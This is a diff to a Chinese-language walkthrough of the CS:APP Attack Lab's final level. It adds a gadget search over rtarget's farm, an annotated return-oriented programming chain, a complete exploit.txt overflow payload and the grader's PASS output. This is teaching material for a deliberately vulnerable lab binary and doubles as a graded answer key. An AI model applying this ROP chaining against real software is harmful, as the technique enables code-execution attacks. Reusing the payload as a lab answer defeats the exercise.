@@ -246,7 +246,7 @@ PASS: Would have posted the following:
 $ objdump -d rtarget > rtarget.d
 ```
 
-在 `start_farm` 与 `mid_farm` 之间（即 900~936 行，可存入 `half_farm.d` 以便检索），编码 `0xc3` 共出现 13 次 —— 可用指令只能取自这 13 处。
+在 `start_farm` 与 `mid_farm` 之间（可存入 `half_farm.d` 以便检索），编码 `0xc3` 共出现 13 次 —— 可用指令只能取自这 13 处。
 
 `cookie` 的编码几乎不可能出现在 `half_farm.d` 内，故不能像[第二关](#第二关)那样用 `mov` 直接移入寄存器，而必须借 `getbuf()` 植入栈内，并借 `pop` 指令取出。因此，实现 `touch2(cookie)` 的最简单的方案为
 
@@ -300,5 +300,128 @@ PASS: Would have posted the following:
         course  15213-f15
         lab     attacklab
         result  1:PASS:0xffffffff:rtarget:2:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+```
+
+### 第五关
+
+在 `start_farm` 与 `end_farm` 之间（可存入 `full_farm.d` 以便检索），编码 `0xc3` 共出现 50 次 —— 可用指令只能取自这 50 处。
+
+- 用正则表达式 `48 89 [cdef]` 搜索，得 9 处：
+  - `48 89 c7` 出现 3 次，其中可用作 `movq %rax, %rdi` 的有
+    - 始于 `0x4019a2` 的 `48 89 c7 c3`
+    - 始于 `0x4019c5` 的 `48 89 c7 90 c3`
+  - `48 89 e0` 出现 6 次，其中可用作 `movq %rsp, %rax ` 的有
+    - 始于 `0x401a06` 的 `48 89 e0 c3`
+    - 始于 `0x401aad` 的 `48 89 e0 90 c3`
+  - 不存以 `%rsp` 为目标的 `movq` 指令（即 `48 89 [cdef][4c]`），故 `%rsp` 只能被 `popq` 即 `retq` 修改。
+- 置 `0` 操作只能借 `movl` 实现。用正则表达式 `89 [cdef]` 搜索，并排除  `48 89 [cdef]`，得 16 处：
+  - `89 c2` 出现 6 次，其中可用作 `movl %eax, %edx` 的有
+    - 始于 `0x4019dd` 的 `89 c2 90 c3`
+    - 始于 `0x401a42` 的 `89 c2 84 c0 c3`
+  - `89 ce` 出现 4 次，其中可用作 `movl %ecx, %esi` 的有
+    - 始于 `0x401a13` 的 `89 ce 90 90 c3`
+    - 始于 `0x401a27` 的 `89 ce 38 c0 c3`
+  - `89 d1` 出现 4 次，其中可用作 `movl %edx, %ecx` 的有
+    - 始于 `0x401a34` 的 `89 d1 38 c9 c3`
+    - 始于 `0x401a68` 的 `89 d1 08 db c3`
+  - `89 e0` 出现 2 次
+
+```gas
+retq # to 0x4019a2 --- the address of `movq %rax, %rdi`
+# R[rax] == 1
+movq %rax, %rdi # 48 89 c7
+retq # to 0x4019dd --- the address of `movl %eax, %edx`
+movl %eax, %edx # 89 c2
+retq # to 0x401a34 --- the address of `movl %edx, %ecx`
+movl %edx, %ecx # 89 d1 (38 c9)
+retq # to 0x401a13 --- the address of `movl %ecx, %esi`
+movl %ecx, %esi # 89 ce (90 90)
+retq # to 0x4019d6 --- the address of `add_xy()`
+leaq (%rdi,%rsi), %rax # 48 8d 04 37
+retq # to 0x4019a2 --- the address of `movq %rax, %rdi`
+# R[rax] == 2, R[rsi] == 1
+# ...
+# R[rax] == 4, R[rsi] == 2
+# ...
+# R[rax] == 8, R[rsi] == 4
+# ...
+# R[rax] == 16, R[rsi] == 8
+# ...
+# R[rax] == 32, R[rsi] == 16
+movq %rax, %rdi # 48 89 c7
+retq # to 0x4019dd --- the address of `movl %eax, %edx`
+movl %eax, %edx # 89 c2
+retq # to 0x401a34 --- the address of `movl %edx, %ecx`
+movl %edx, %ecx # 89 d1 (38 c9)
+retq # to 0x401a13 --- the address of `movl %ecx, %esi`
+movl %ecx, %esi # 89 ce (90 90)
+retq # to 0x401a06 --- the address of `movq %rsp, %rax`
+# sval = R[rsp] + 32, R[rsi] = 32
+movq %rsp, %rax # 48 89 e0
+retq # to 0x4019a2 --- the address of `movq %rax, %rdi`
+movq %rax, %rdi # 48 89 c7
+retq # to 0x4019d6 --- the address of `add_xy()`
+leaq (%rdi,%rsi), %rax
+retq # to 0x4019a2 --- the address of `movq %rax, %rdi`
+movq %rax, %rdi # 48 89 c7
+# sval = R[rsp] + 8
+retq # to `0x4018fa`, which is the address of `touch3()`
+# sval = R[rdi]
+```
+
+```c
+/* exploit.txt */
+/* buf[00, 08) */ 90 90 90 90 90 90 90 90
+/* buf[08, 16) */ 90 90 90 90 90 90 90 90
+/* buf[16, 24) */ 90 90 90 90 90 90 90 90
+/* buf[24, 32) */ 90 90 90 90 90 90 90 90
+/* buf[32, 40) */ 90 90 90 90 90 90 90 90
+/* 000 */ a2 19 40 00 00 00 00 00
+/* -01 */ dd 19 40 00 00 00 00 00
+/* -02 */ 34 1a 40 00 00 00 00 00
+/* -03 */ 13 1a 40 00 00 00 00 00
+/* -04 */ d6 19 40 00 00 00 00 00
+/*  1  */ a2 19 40 00 00 00 00 00
+/* -01 */ dd 19 40 00 00 00 00 00
+/* -02 */ 34 1a 40 00 00 00 00 00
+/* -03 */ 13 1a 40 00 00 00 00 00
+/* -04 */ d6 19 40 00 00 00 00 00
+/*  2  */ a2 19 40 00 00 00 00 00
+/* -01 */ dd 19 40 00 00 00 00 00
+/* -02 */ 34 1a 40 00 00 00 00 00
+/* -03 */ 13 1a 40 00 00 00 00 00
+/* -04 */ d6 19 40 00 00 00 00 00
+/*  4  */ a2 19 40 00 00 00 00 00
+/* -01 */ dd 19 40 00 00 00 00 00
+/* -02 */ 34 1a 40 00 00 00 00 00
+/* -03 */ 13 1a 40 00 00 00 00 00
+/* -04 */ d6 19 40 00 00 00 00 00
+/*  5  */ a2 19 40 00 00 00 00 00
+/* -01 */ dd 19 40 00 00 00 00 00
+/* -02 */ 34 1a 40 00 00 00 00 00
+/* -03 */ 13 1a 40 00 00 00 00 00
+/* -04 */ d6 19 40 00 00 00 00 00
+/*  6  */ a2 19 40 00 00 00 00 00
+/* -01 */ dd 19 40 00 00 00 00 00
+/* -02 */ 34 1a 40 00 00 00 00 00
+/* -03 */ 13 1a 40 00 00 00 00 00
+/* movq %rsp, %rax */ 06 1a 40 00 00 00 00 00
+/* movq %rax, %rdi */ a2 19 40 00 00 00 00 00
+/* add_xy */ d6 19 40 00 00 00 00 00
+/* movq %rax, %rdi */ a2 19 40 00 00 00 00 00
+/* touch3 */ fa 18 40 00 00 00 00 00
+/* cookie */ 35 39 62 39 39 37 66 61
+/*  tail  */ 00 01 02 03 04 05
+```
+
+```
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 01 02 03 04 05 
 ```
 
